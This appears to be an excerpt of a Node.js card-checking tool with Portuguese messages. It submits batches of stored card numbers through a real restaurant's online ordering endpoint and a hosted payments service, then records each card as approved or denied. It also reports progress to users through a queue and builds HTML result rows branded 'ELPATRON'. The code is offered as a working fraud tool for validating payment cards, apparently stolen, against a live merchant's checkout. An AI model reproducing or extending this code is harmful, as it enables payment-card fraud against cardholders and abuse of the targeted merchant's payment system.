...
module.exports = {
        ...
        try {
            ...
            axios.post(`https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/`, data, {
                ...
                for (const key of keys) {
                    ...
                    if (key == 'errorMsg') {
                         Queue.sendToQueue(false, id + '#verificar#cards', true)
                        Queue.sendToQueue(false, 'sistem#erro#' + response.data.status, response.data.errorMsg)
                         Queue.sendToQueue(false, id + '#'+ username, {type:'atividade',msg: 'Erro na verificação! iniciando.. nova verificação, Aguarde...'})
    ...
    async getFilds(id, username, code) {
        if(code ==='code'){
            Queue.sendToQueue(false, id + '#'+ username, {type:'atividade',msg:'Erro na verificação da orden, entrando com nova verificação, Agurade..'})
            return
        }
        try {
 ...
 axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, {
                ...
                for (let i = 0; i < cards.length; i++) {
                    ...
                    axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, data, {
                        ...
                        '</td> </tr>'
                        Queue.sendToQueue(false, id + '#'+ username+'#status', {type:'aprovado',msg:aprovado})
                                  Queue.sendToQueue(false, id + '#'+ username+'#status', {type:'card',msg:'valid'})
                                  Queue.sendToQueue(false, id + '#'+ username, {type:'atividade',msg: cards[i].card.number+' Verificado e foi APROVADO, Agurade..'})
                                await CadastroCards.where({ _id: cards[i]._id }).updateOne({ tested: true, valid: true})
                             
                                await this.CardsBeing(cards[i],true)
                        ...
                        '<span class="label label-sm label-info">ELPATRON</span>' +
                        '</td> </tr>'
                            Queue.sendToQueue(false, id + '#'+ username, {type:'atividade',msg: cards[i].card.number+' Verificado e  foi NEGADO, Agurade..'})
                            Queue.sendToQueue(false, id + '#'+ username+'#status', {type:'card',msg:'denied'})
                            ...
                            Queue.sendToQueue(false, id + '#'+ username+'#status', {type:'aprovado',msg:negado})
                                ...
                                await this.CardsBeing(cards[i],false)
                               
                                
                                break;
                        }
                Queue.sendToQueue(false, id + '#'+ username, {type:'atividade',msg: ' Novos Cards estão Sendo Verificados....'})
                const terminado = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(1);
                console.log(terminado)
                if(terminado ==''){
                     Queue.sendToQueue(false, id + '#'+ username, { type: 'statusfim', msg: 'Aguardando...' })
                     Queue.sendToQueue(false, id + '#'+ username, { type: 'atividade', msg: 'Não Existe Cards para ser verificados, Verificação finalizada com sucesso!....por favor atualize a página para nova verificação' })
    ...
    async CardsBeing(dados,v){
           
                const cadastro = new CardsBeingTested({
                    userID: dados.userID,
                    owner: dados.owner,
                    card: {
